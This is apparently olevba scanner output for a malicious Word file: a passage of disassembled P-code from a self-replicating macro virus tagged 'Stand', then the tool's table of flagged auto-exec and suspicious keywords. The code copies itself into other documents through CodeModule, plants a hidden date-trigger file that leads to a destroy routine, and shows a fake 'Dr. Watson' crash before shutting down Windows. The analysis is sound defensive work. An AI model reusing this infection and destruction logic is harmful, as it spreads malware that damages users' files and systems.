' 	Ld Count 
' 	Ld stress 
' 	Ld mad 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #169:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #170:
' 	Loop 
' Line #171:
' 	Label cpyvir 
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #172:
' 	EndIfBlock 
' Line #173:
' 	EndFunc 
' Line #174:
' Line #175:
' 	FuncDefn (Private Function StandWrite(StartM, id_FFFE As Variant))
' Line #176:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #177:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #178:
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Ld StartM 
' 	LitVarSpecial (False)
' 	ArgsLd StandFind 0x0003 
' 	St Count 
' Line #179:
' 	Ld Count 
' 	LitStr 0x0005 "Stand"
' 	Ne 
' 	IfBlock 
' Line #180:
' 	Ld Count 
' 	LitStr 0x0009 "Stand Yes"
' 	FnLen 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "Stand Yes"
' 	Eq 
' 	IfBlock 
' Line #181:
' 	Ld Count 
' 	Ld Count 
' 	FnLen 
' 	LitStr 0x0009 "Stand Yes"
' 	FnLen 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St Count 
' Line #182:
' 	EndIfBlock 
' Line #183:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "End Function"
' 	Eq 
' 	Or 
' 	DoUnitil 
' Line #184:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St stress 
' Line #185:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld stress 
' 	PrintItemNL 
' Line #186:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #187:
' 	Loop 
' Line #188:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #189:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #190:
' 	EndIfBlock 
' Line #191:
' 	EndFunc 
' Line #192:
' Line #193:
' 	FuncDefn (Private Sub Document_Close())
' Line #194:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #195:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #196:
' 	OnError (Resume Next) 
' Line #197:
' 	LitStr 0x000F "c:\autoexec.kil"
' 	Ld vbArchive 
' 	Ld vbHidden 
' 	Add 
' 	Ld vbReadOnly 
' 	Add 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #198:
' 	LitStr 0x000F "c:\autoexec.kil"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #199:
' 	ArgsCall Read 0x0000 
' Line #200:
' 	LitStr 0x0001 "d"
' 	LitDI2 0x001E 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Date 
' 	ArgsLd DateAdd 0x0003 
' 	St Dataccia 
' Line #201:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Dataccia 
' 	PrintItemNL 
' Line #202:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #203:
' 	LitStr 0x000F "c:\autoexec.kil"
' 	Ld vbArchive 
' 	Ld vbHidden 
' 	Add 
' 	Ld vbReadOnly 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #204:
' 	ElseBlock 
' Line #205:
' 	LitStr 0x000F "c:\autoexec.kil"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #206:
' 	LitDI2 0x0001 
' 	Ld Dataccia 
' 	LineInput 
' Line #207:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #208:
' 	LitStr 0x0001 "d"
' 	Ld Date 
' 	Ld Dataccia 
' 	ArgsLd DateDiff 0x0003 
' 	LitDI2 0x0000 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	ArgsCall StandDestroy 0x0000 
' 	EndIf 
' Line #209:
' 	EndIfBlock 
' Line #210:
' 	EndSub 
' Line #211:
' Line #212:
' 	FuncDefn (Private Sub Document_Open())
' Line #213:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #214:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #215:
' 	ArgsCall Stand 0x0000 
' Line #216:
' 	EndSub 
' Line #217:
' Line #218:
' 	FuncDefn (Private Sub Document_New())
' Line #219:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #220:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #221:
' 	ArgsCall Stand 0x0000 
' Line #222:
' 	EndSub 
' Line #223:
' Line #224:
' 	FuncDefn (Private Sub ViewVBCode())
' Line #225:
' 	LitStr 0x0033 "This application caused a general protection error:"
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x001C "The system will be restarted"
' 	Add 
' 	Ld vbCritical 
' 	LitStr 0x000A "Dr. Watson"
' 	ArgsCall MsgBox 0x0003 
' Line #226:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #227:
' 	EndSub 
' Line #228:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |kill.bat            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

